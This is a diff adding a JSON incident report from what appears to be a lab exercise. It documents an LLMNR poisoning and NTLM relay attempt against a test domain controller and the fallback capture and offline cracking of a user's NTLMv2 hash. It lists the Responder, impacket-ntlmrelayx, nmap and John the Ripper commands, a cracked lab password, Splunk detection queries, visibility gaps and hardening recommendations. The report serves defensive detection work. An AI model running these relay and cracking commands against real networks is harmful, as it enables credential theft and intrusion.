@@ -1,0 +1,144 @@
+{
+  "incident": {
+    "id": "ATK-002",
+    "title": "SMB Relay — NTLM Relay Attempt and Hash Capture Fallback",
+    "severity": "HIGH",
+    "status": "Documented — Lab Exercise (SMB signing blocked shell — hash capture fallback executed)",
+    "environment": "CorpLab",
+    "domain": "corp.local",
+    "date": "2026-04-21",
+    "attacker_ip": "10.10.10.99",
+    "victim": "Win11 — 10.10.10.50 (corp\\jsmith)",
+    "relay_target": "DC01.corp.local — 10.10.10.40",
+    "outcome": "SMB signing on DC01 blocked relay shell. NTLMv2 hash captured as fallback. jsmith:Password123! recovered.",
+    "mitre_techniques": [
+      "T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay",
+      "T1110.002 - Password Cracking"
+    ]
+  },
+  "kill_chain": [
+    {
+      "stage": 1,
+      "name": "LLMNR Poisoning — Responder SMB Off",
+      "technique": "T1557.001",
+      "tool": "Responder",
+      "config_change": "SMB = Off and HTTP = Off in /etc/responder/Responder.conf",
+      "command": "responder -I eth0 -dPv",
+      "result": "Win11 LLMNR broadcast poisoned. Auth redirected to Kali 10.10.10.99. ntlmrelayx receives incoming connection.",
+      "detected": false,
+      "detection_note": "VIS-001 — intra-LAN traffic never routes through OPNsense/Suricata."
+    },
+    {
+      "stage": 2,
+      "name": "NTLM Relay Attempt to DC01",
+      "technique": "T1557.001",
+      "tool": "impacket-ntlmrelayx",
+      "command": "impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support",
+      "targets_file": "10.10.10.40",
+      "result": "Relay reached DC01. Rejected — SMB signing required. Session not established for command execution.",
+      "relay_outcome": "BLOCKED — Message signing enabled and required on DC01",
+      "detected": true,
+      "detection_note": "EC4624, NTLM, Logon_Type=3, src_ip=10.10.10.99. NTLM Type 3 logon from Linux IP for domain account."
+    },
+    {
+      "stage": 3,
+      "name": "Hash Capture Fallback",
+      "technique": "T1557.001",
+      "tool": "impacket-ntlmrelayx",
+      "result": "NTLMv2 hash for jsmith captured during relay exchange before signing rejection.",
+      "detected": false,
+      "detection_note": "Hash captured at network layer — no endpoint log generated."
+    },
+    {
+      "stage": 4,
+      "name": "Offline Hash Cracking",
+      "technique": "T1110.002",
+      "tool": "John the Ripper",
+      "command": "john --format=netntlmv2 --wordlist=/tmp/corp_wordlist.txt /tmp/jsmith.hash",
+      "result": "Password123! recovered for jsmith.",
+      "detected": false,
+      "detection_note": "Offline operation — no logging system can detect this."
+    }
+  ],
+  "smb_signing_check": {
+    "command": "nmap --script smb2-security-mode -p 445 10.10.10.40",
+    "result": "Message signing enabled and required",
+    "implication": "Relay-to-shell blocked on DC01. Pivot required to member servers or workstations for full relay."
+  },
+  "splunk_evidence": [
+    {
+      "detection": "NTLM relay — domain account from attacker IP",
+      "query": "index=windows EventCode=4624 Authentication_Package=NTLM Logon_Type=3 | where NOT match(src_ip, \"^10\\.10\\.10\\.(40|30|1)$\") | table _time, Account_Name, src_ip",
+      "result": "jsmith logon from 10.10.10.99",
+      "event_count": 1
+    }
+  ],
+  "iocs": {
+    "attacker_ip": "10.10.10.99",
+    "victim_ip": "10.10.10.50",
+    "relay_target": "10.10.10.40",
+    "captured_account": "jsmith",
+    "cracked_password": "Password123!",
+    "tools_used": ["Responder", "impacket-ntlmrelayx", "John the Ripper"]
+  },
+  "detections": [
+    {
+      "id": "DET-002-01",
+      "name": "NTLM relay — domain account from attacker IP",
+      "eventcode": "4624",
+      "filter": "Authentication_Package=NTLM AND Logon_Type=3 AND src_ip not in domain infrastructure",
+      "evidence_found": true,
+      "mitre": "T1557.001",
+      "severity": "Critical"
+    },
+    {
+      "id": "DET-002-02",
+      "name": "NTLM spike from single non-domain IP",
+      "eventcode": "4624",
+      "filter": "Count of NTLM Type 3 from same src_ip above threshold",
+      "evidence_found": true,
+      "mitre": "T1557.001",
+      "severity": "High"
+    },
+    {
+      "id": "DET-002-03",
+      "name": "SMB signing rejection at network layer",
+      "eventcode": "N/A",
+      "filter": "Suricata — not visible",
+      "evidence_found": false,
+      "gap": "VIS-001",
+      "mitre": "T1557.001",
+      "severity": "Gap"
+    }
+  ],
+  "visibility_gaps": [
+    {
+      "id": "VIS-001",
+      "description": "Suricata blind to intra-LAN relay traffic",
+      "impact": "SMB relay negotiation invisible at network layer",
+      "fix": "SPAN port mirroring (Sprint 4)"
+    },
+    {
+      "id": "VIS-003",
+      "description": "Offline hash cracking undetectable",
+      "impact": "Crack phase permanently invisible",
+      "fix": "Accepted — prevent hash exposure upstream"
+    },
+    {
+      "id": "VIS-004",
+      "description": "If relay target is workstation, events only on that host",
+      "impact": "Detection moves to target workstation — needs UF there",
+      "fix": "Ensure Splunk UF on all Windows hosts"
+    }
+  ],
+  "key_lesson": "DC01 SMB signing enforced by default — correct posture. Real attack pivots to member servers or workstations where signing is enabled but not required. Enforcing SMB signing via GPO on ALL hosts eliminates relay entirely.",
+  "sigma_rule": "sigma_smbrelay_T1557.001.yml",
+  "detection_rate": "1/3 active stages (33%)",
+  "recommendations": [
+    "Enforce SMB signing on ALL hosts via GPO — not just DCs",
+    "Disable LLMNR and NBT-NS domain-wide via GPO",
+    "Deploy Splunk UF on win11-vm to capture victim-side events",
+    "Monitor for NTLM Type 3 logons from non-domain-joined IP addresses",
+    "Consider deploying 802.1X network authentication to prevent rogue devices"
+  ]
+}
